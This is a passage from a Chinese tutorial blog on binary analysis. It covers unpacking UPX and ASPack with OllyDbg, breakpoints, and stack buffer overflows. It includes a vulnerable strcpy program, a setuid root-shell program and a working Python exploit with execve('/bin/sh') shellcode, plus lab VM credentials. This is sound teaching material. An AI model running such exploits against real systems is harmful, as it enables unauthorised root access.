<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401052</span>                 <span class="k">cmp</span>     <span class="n">dl</span><span class="p">,</span> <span class="p">[ecx]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401054</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_401070</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401056</span>                 <span class="k">test</span>    <span class="n">dl</span><span class="p">,</span> <span class="n">dl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401058</span>                 <span class="k">jz</span>      <span class="n">short</span> <span class="n">loc_40106C</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040105</span><span class="n">A</span>                 <span class="k">mov</span>     <span class="n">dl</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">1</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040105</span><span class="n">D</span>                 <span class="k">cmp</span>     <span class="n">dl</span><span class="p">,</span> <span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">1</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401060</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_401070</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401062</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">2</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401065</span>                 <span class="k">add</span>     <span class="n">ecx</span><span class="p">,</span> <span class="mi">2</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401068</span>                 <span class="k">test</span>    <span class="n">dl</span><span class="p">,</span> <span class="n">dl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040106</span><span class="n">A</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_401050</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040106</span><span class="n">C</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040106</span><span class="n">C</span> <span class="n">loc_40106C</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+58j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040106</span><span class="n">C</span>                 <span class="k">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040106</span><span class="n">E</span>                 <span class="k">jmp</span>     <span class="n">short</span> <span class="n">loc_401075</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401070</span> <span class="c">; ---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401070</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401070</span> <span class="n">loc_401070</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+54j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401070</span>                                         <span class="c">; _main+60j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401070</span>                 <span class="k">sbb</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401072</span>                 <span class="k">sbb</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFFFh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401075</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401075</span> <span class="n">loc_401075</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+6Ej</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401075</span>                 <span class="k">test</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401077</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_401091</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401079</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">aCorrect</span> <span class="c">; "correct!\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040107</span><span class="n">E</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401084</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">4</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401087</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">getchar</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040108</span><span class="n">D</span>                 <span class="k">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040108</span><span class="n">F</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401090</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401091</span> <span class="c">; ---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401091</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401091</span> <span class="n">loc_401091</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+77j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401091</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">aAuthError</span> <span class="c">; "auth error\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401096</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040109</span><span class="n">C</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">4</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040109</span><span class="n">F</span>                 <span class="k">or</span>      <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFFFh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004010</span><span class="n">A2</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004010</span><span class="n">A3</span>                 <span class="k">retn</span>
</code></pre></div></div>

<p>直接编译之后，静态分析，无论是程序逻辑和流程，还是用于对比参数的字符串，以及输出的内容，都原原本本地展现了出来。</p>

<p>接下来用，UPX打包一下：</p>

<p><img src="/img/interestingBin/1489043494211.png" alt="upx打包" />
IDA Pro分析：
<img src="/img/interestingBin/1489046354996.png" alt="Alt text" /></p>

<p>程序变得复杂。用二进制编辑器打开可执行文件，我们也无法找到correct!、author error等字符串。这也就是打包器能够防止逆向地原因。</p>

<h5 id="将压缩过的文件解包">将压缩过的文件解包</h5>

<p>一般地，打包器和解包器是配套的。除了UPX外(加参数-d，尽管无法还原到一模一样，但还是可以用IDA分析)，以防止逆向工程为目的地打包器通常都没有解包器。因此要想解包只能自立更受手动完成或者使用某些第三方制作地解包器。</p>

<p>手动解包，就是用调试器和反汇编器跟踪可执行文件解压缩地逻辑，并将位于内存中地解压缩后地可执行数据导出到文件的操作。</p>

<p>每种打包器的压缩算法不同，若解包器本身还附带反调试代码就会让分析变得更加困难。</p>

<h5 id="通过手动解包upx来理解工作原理">通过手动解包UPX来理解工作原理</h5>

<p>下载<a href="http://www.openrce.org/downloads/details/108/OllyDump">OllyDump</a>，并放于OD的插件目录下。。</p>

<p>用OllyICE打开upxpack.exe。开头的pushad指令的功能，是将所有寄存器的值撤退(复制)到栈。
继续按F8跟进，按了一会，程序再这个地方进入了循环。</p>

<p><img src="/img/interestingBin/1489050195631.png" alt="Alt text" /></p>

<blockquote>
  <p>该段的逻辑是，esi的地址向edi的地址复制数据。从复制的目标，即edi的地址可以看出，是从00401000开始逐字节进行复制。</p>
</blockquote>

<p>按F8继续运行，但为了省时，直接再下面代码中找到popad指令，然后再这里设置一个断点，并按F9运行到断点的位置。
<img src="/img/interestingBin/1489052201829.png" alt="" /></p>

<p>在popad下面不远处的<code class="highlighter-rouge">00407B74</code>有一个jmp指令，按F8单步运行到jmp指令的地方，会跳转到<code class="highlighter-rouge">00401341</code>处的一条call指令上。</p>

<p>在<code class="highlighter-rouge">004013141</code>处，打开OllyDump，Dump debugged process。
<img src="/img/interestingBin/1489053134668.png" alt="Alt text" /></p>

<p>这样就完成解包，打开解包后的程序，观察<code class="highlighter-rouge">00401000</code>处之后的反汇编代码，和原程序的一样。</p>

<p><strong>将打包器添加的用于解压缩的那部分代码在OllyDbg上运行，然后将解压缩到内存中的可执行数据用OllyDump转储到文件中。其实，开头的pushad和最后的popad中间的逻辑就是用于解压缩的程序。</strong></p>

<p><strong>具体的就是，在运行解压缩程序之前，先将当前的寄存器状态保存到栈中，在解压缩结束之后再从栈中恢复寄存器状态。这样一来，寄存器的值就恢复到了运行解压缩程序之前的状态，便于正确运行解压缩之后的真正的程序代码。</strong></p>

<p><strong>总之，大部分打包器都是使用此原理，因此一定会在某个时间点完成解压缩，然后切换到真正的程序。手动解包的关键就是“找到解压缩程序结束的瞬间(位置)”</strong></p>

<h5 id="用硬件断点对aspack进行解包">用硬件断点对ASPack进行解包</h5>

<p>对于<a href="http://ch.aspack.com/">ASPack</a>的解包，基本方法也是找到和pushed相对应的popad.但找到对应的popad非常困难，因此需要下硬件断点。</p>

<p><strong>硬件断点和软件断点的区别：</strong></p>

<p><strong>软件断点的原理很简单，本质就是调试器将断点位置的指令改成0xCC(int3h)。处理器遇到<code class="highlighter-rouge">0xCC</code>指令，会通过操作系统将异常报告给调试器，因此，只要在指定位置写入<code class="highlighter-rouge">0xCC</code>，就可以在任意的时间和位置中断程序运行.</strong></p>

<p><strong>硬件断点,和软件断点一样，硬件断点也可以中断程序运行并向调试器发出报告，但它并非通过<code class="highlighter-rouge">0xCC</code>指令来实现，而是通过直接写入寄存器(DR寄存器)来实现的。此外硬件断点不仅能够在指定的位置中断程序运行，还可以实现一些复杂的中断，“例如当向指定地址写入数据时中断”“当从指定地址读取数据时中断”等。换言之，硬件断点比软件断点功能强大</strong>。不过，硬件断点数量有限。软件断点地设置数量是没有限制地，但硬件断点却只能设置四个(因为处理器只设计了4个硬件断点)。</p>

<p>在软件分析过程中，遇到<code class="highlighter-rouge">0xCC</code>可能会被覆盖地情况时，一般会用硬件断点。</p>

<p>案例分析：</p>

<p>用OD打开ASPack打包地可执行文件，并按下“Ctrl+G”输入<code class="highlighter-rouge">00401000</code>(一直往下找肯定能找到popad，但这种找很费力。可以在<code class="highlighter-rouge">00401000</code>处下一个硬件断点。若操作系统启用了ASLR安全机制，那么该地址有可能不是00401000，此时只能找popad)
<img src="/img/interestingBin/1489055719970.png" alt="Alt text" /></p>

<p>由于可执行数据没有解包，因此现在这些数据是无法进行反汇编。
接下来在<code class="highlighter-rouge">00401000</code>处设置硬件断点，右键-&gt;Breakpoint-&gt;Hardware,on execution</p>

<p><img src="/img/interestingBin/1489056152865.png" alt="下硬件断点" /></p>

<p>接下来，按F9运行程序，然后程序会在00401000处中断运行。此时，可执行数据已经解包，画面未出现反汇编代码，这时候按下Ctrl+A，OllyDbg会重新分析程序代码。</p>

<p><img src="/img/interestingBin/1489074601086.png" alt="Alt text" /></p>

<p>后面的操作就跟UPX完全一样，使用OllyDump将文件导出，解包工作就完成。</p>

<blockquote>
  <p>当然，在这个工作中，走了不少弯路，手贱地将硬件断点下在dll里面，后面调试跳不出dll，问了同学在找到问题所在。在查看-&gt;断点中，删除了dll地断点，进入程序调试界面，开始脱壳。也可使用ESP定律。</p>
</blockquote>

<p>无论什么软件，其本质都是处理器可以解释并指定地机器语言指令，因此“即便采取了难度再高地对策，只要能够读出组成软件地所有机器语言指令，就一定能找到破解地方法”</p>

<h2 id="利用软件漏洞进行攻击">利用软件漏洞进行攻击</h2>

<p>靶机：</p>
<ul>
  <li><a href="http://07c00.com/tmp/Ubuntu-12.04_binbook.zip">Ubuntu-12.04</a>:
    <ul>
      <li>用户名:root 密码:root</li>
      <li>用户名:guest 密码:guest</li>
    </ul>
  </li>
  <li><a href="http://07c00.com/tmp/FreeBSD_8.3_binbook.zip">FreeBSD-8.3</a>
    <ul>
      <li>用户名:root 密码:root</li>
      <li>用户名:guest 密码:guest</li>
    </ul>
  </li>
</ul>

<h3 id="利用缓冲区漏洞溢出执行任意代码">利用缓冲区漏洞溢出执行任意代码</h3>

<h4 id="引发缓冲区溢出示例">引发缓冲区溢出示例</h4>
<p>缓冲区溢出：输入的数据超出了程序规定地内存范围，数据溢出导致程序发生异常</p>

<p>例子：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/img/interestingBin/1489113763977.png" alt="缓冲区溢出" /></p>

<blockquote>
  <p>该程序具有缓冲区溢出功能。这个程序为buff数组分配一块64字节地内存空间，但传递地参数argv[1]是由用户任意输入，因此参数长度很有可能超过64字节。
strcpy用于复制字符串，一直复制字符串到字符串地边界，即遇到”\0”为止。当用户故意向程序传递一个超过64字节地字符串时，就会在main函数中引发缓冲区溢出。</p>
</blockquote>

<h4 id="让普通用户用管理员权限运行程序">让普通用户用管理员权限运行程序</h4>

<p>Linux和FreeBSD中有一个用来修改密码的命令“passwd”。密码一般保存在<code class="highlighter-rouge">/etc/master.passwd</code>、<code class="highlighter-rouge">/etc/passwd</code>、<code class="highlighter-rouge">etc/shadow</code>等中，没有root权限无法修改这些文件。</p>

<p><code class="highlighter-rouge">setuid</code>的功能是让用户使用程序的所有者权限来运行程序。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span>  <span class="n">wheel</span>  <span class="mi">1438</span> <span class="n">Apr</span> <span class="mi">29</span>  <span class="mi">2013</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">-</span><span class="n">r</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">root</span>  <span class="n">wheel</span>  <span class="mi">6360</span> <span class="n">Apr</span> <span class="mi">10</span>  <span class="mi">2012</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">passwd</span>
</code></pre></div></div>

<blockquote>
  <p><code class="highlighter-rouge">/etc/passwd</code>文件不允许除root以外的用户进行写入，但passwd命令可以(通过setuid机制)临时root全新啊运行。</p>
</blockquote>

<blockquote>
  <p>“r-s”中的s表示该程序已启用setuid</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">exe</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>

    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">exe</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execve</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>调用execve函数运行/bin/sh</p>
</blockquote>

<p>root权限编译该程序，然后设置setuid。<code class="highlighter-rouge">ls -l</code>查看权限，已经启用了setuid</p>

<p><img src="/img/interestingBin/1489114760927.png" alt="setuid" /></p>

<p>当再次以普通用户权限运行这个程序时，会用root权限调用execve函数，普通用户就会以root权限启动<code class="highlighter-rouge">/bin/sh</code>。当运行所编译的程序之后，普通用户权限就变成root了。
<img src="/img/interestingBin/1489115526769.png" alt="root权限" /></p>

<h4 id="权限如何被夺取">权限如何被夺取</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp, %eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">cpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"0x%08lx"</span><span class="p">,</span> <span class="n">get_sp</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">cpy</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/local/bin/python</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
	<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x41414141</span>
<span class="k">else</span><span class="p">:</span>
	<span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">s</span>  <span class="o">=</span> <span class="s">""</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xc0\x50\x89\xe0\x83\xe8\x10</span><span class="s">"</span> <span class="c"># 8</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x50\x89\xe3\x31\xc0\x50\x68\x2f</span><span class="s">"</span> <span class="c">#16</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"</span> <span class="c">#24</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x89\xe2\x31\xc0\x50\x53\x52\x50</span><span class="s">"</span> <span class="c">#32</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb0\x3b\xcd\x80\x90\x90\x90\x90</span><span class="s">"</span> <span class="c">#40</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c">#48</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c">#56</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span> <span class="c">#64</span>
<span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90</span><span class="s">"</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span><span class="n">addr</span><span class="p">)</span> <span class="c">#72</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</code></pre></div></div>

<p>运行两个程序</p>

<p><img src="/img/interestingBin/1489116069190.png" alt="运行两个程序" /></p>

<p>sample3.c的cpy函数会将输入的字符串原原本本得复制到一块只有64字节得内存空间中。由于字符串是由用户任意输入得，因此exploit.py 的输出结果输入给sample3.c，就能成功地以所有者权限运行<code class="highlighter-rouge">/bin/sh</code></p>

<h4 id="栈使用运行空间">栈使用运行空间</h4>

<p>栈是一种内存的使用方式，栈并不是一种物理上真实存在的东西，它是普通的内存空间。</p>

<p><strong>向栈存入数据</strong></p>

<p><img src="/img/interestingBin/1489119852167.png" alt="Alt text" />
在程序开始运行时，先要确定栈的起点(基地址)。假设栈的起点为bffff6fc(ebp=esp)，bffff6fc已经存在0x01。
<img src="/img/interestingBin/1489119988554.png" alt="Alt text" />
bffff6fc的值为0x01，执行push命令，push 0x02。最早的地址中还是不变为0x01,0x02保存到相邻的地址中。
<img src="/img/interestingBin/1489120781647.png" alt="Alt text" />
栈是从后往前(向地址递减的方向)增长的。若不断执行push指令，push的值就会不断被存入更靠前的内存地址中。esp寄存器中则保存了最新入栈的内存地址。
<img src="/img/interestingBin/1489120928505.png" alt="Alt text" /></p>

<blockquote>
  <p>将0x02~0x05的值按顺序push时栈的状态。</p>
</blockquote>

<p><strong>从栈中取出数据</strong></p>

<p>从栈中取出数据时，使用pop指令，pop指令会从栈的最低位地址取出一条数据。
栈的最低位地址叫做这个栈的“栈顶”(esp)
<img src="/img/interestingBin/1489121561708.png" alt="Alt text" />
执行pop eax
最后push的数据为0x05，这条数据会被首先pop出来，因此，eax里面会被存入0x05，这条数据会被首先pop出来。因此，eax里面会被存入0x05。
<img src="/img/interestingBin/1489121628523.png" alt="Alt text" />
再执行一次pop，就取出了0x04。
这时，esp的值也会发生变化，先从<code class="highlighter-rouge">bffff6ec</code>变成bffff6f0，然后再变成bffff6f4。</p>

<blockquote>
  <p>栈，是LIFO(Last In,First Out)，即后进先出。队列是先进先出(FIFO)。</p>
</blockquote>

<h4 id="执行任意代码">执行任意代码</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">,</span> <span class="kt">int</span> <span class="n">z</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">func</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/img/interestingBin/1489129110768.png" alt="汇编" /></p>

<p>gcc加上-S选项进行编译，然后生成sample4.s文件，即sample4.c的汇编代码。<code class="highlighter-rouge">func</code>函数有三个参数，分别传递了1,2,3三个数字，而func函数，内部没有进行任何处理。</p>

<p><img src="/img/interestingBin/1489129503151.png" alt="汇编代码" /></p>

<p>在C语言中传递的int型参数，在汇编语言中需要在<code class="highlighter-rouge">call func</code>之前存放到栈中。尽管这里的入栈操作没有使用push指令，但功能是相同的。</p>

<p><strong>函数调用时入栈的方法1</strong></p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">push</span> <span class="err">$</span><span class="mi">3</span>  <span class="c1">//esp-=4，将3送入esp+0
</span><span class="k">push</span> <span class="err">$</span><span class="mi">2</span>  <span class="c1">//esp-=4，将2送入esp+0
</span><span class="k">push</span> <span class="err">$</span><span class="mi">1</span>  <span class="c1">//esp-=4，将1送入esp+0
</span></code></pre></div></div>

<p><strong>函数调用时入栈的方法2</strong></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">subl</span>	<span class="err">$</span><span class="mi">12</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span> <span class="c1">//esp-=12
</span>	<span class="n">movl</span>	<span class="err">$</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span> <span class="c1">//将3送入esp+8
</span>	<span class="n">movl</span>	<span class="err">$</span><span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span> <span class="c1">//将2送入esp+4
</span>	<span class="n">movl</span>	<span class="err">$</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>  <span class="c1">//将1送入esp+0
</span></code></pre></div></div>
<p>将参数入栈后，通过call指令调用子程序</p>

<p>和jmp不同，call必须记住调用时当前指令的地址，因此在跳转到子程序的地址之前，需要先将返回地址(ret_addr)push到栈中。
当调用func函数时，在跳转到函数起始地址的瞬间，栈的情形如下图：</p>

<p><img src="/img/interestingBin/1489130168887.png" alt="栈" /></p>

<p>程序执行了push ebp。接下来ebp继续递减，为函数内部的局部变量分配内存空间。
<img src="/img/interestingBin/1489130235261.png" alt="Alt text" /></p>

<p>此时，若数据溢出，超过了原本分配给数组buff的内存空间，数组buff后面的%ebp、ret_addr以及传递给func函数的参数都会被溢出的数据覆盖。一旦%ebp和ret_addr被覆盖掉，<code class="highlighter-rouge">ret_addr</code>存放的是函数逻辑结束后返回main函数的目标地址。也就是说，若覆盖了ret_addr，攻击者就可以让程序跳转到任意地址。若攻击者事先准备好一段代码，然后让程序跳转到这段代码，也就相当于成功攻击了“可执行任意代码的漏洞”。</p>

<h4 id="使用gdb查看程序运行情况">使用gdb查看程序运行情况</h4>

<p>gdb是Unix系统中常用的调试器。</p>

<table>
  <thead>
    <tr>
      <th>命令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>r</td>
      <td>运行程序(可以直接带命令行参数)</td>
    </tr>
    <tr>
      <td>b</td>
      <td>设置断点</td>
    </tr>
    <tr>
      <td>c</td>
      <td>在断点处中断后，继续运行程序</td>
    </tr>
    <tr>
      <td>x/[数字]i</td>
      <td>对指定数量的指令进行反汇编</td>
    </tr>
    <tr>
      <td>disas</td>
      <td>同上</td>
    </tr>
    <tr>
      <td>x/[数字]x</td>
      <td>显示指定长度的数据 /可用地址或寄存器作为参数；传递寄存器时要加$</td>
    </tr>
    <tr>
      <td>x/[数字]s</td>
      <td>以字符串形式显示任意长度的数据</td>
    </tr>
    <tr>
      <td>i r</td>
      <td>显示寄存器的值</td>
    </tr>
    <tr>
      <td>set</td>
      <td>向寄存器或内存写入值</td>
    </tr>
    <tr>
      <td>q</td>
      <td>结束调试 /当出于调试中时，程序会询问是否要结束调试，这时输入y可结束调试</td>
    </tr>
  </tbody>
</table>

<p>使用gdb对程序进行调试有两种方法：</p>

<ul>
  <li>将程序的路径作为参数传递给gdb。如<code class="highlighter-rouge">gdb test00</code></li>
  <li>将gdb挂载到某个进程上.如<code class="highlighter-rouge"> gdb attach 1111</code></li>
</ul>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">gdb</span> <span class="n">sample3</span>
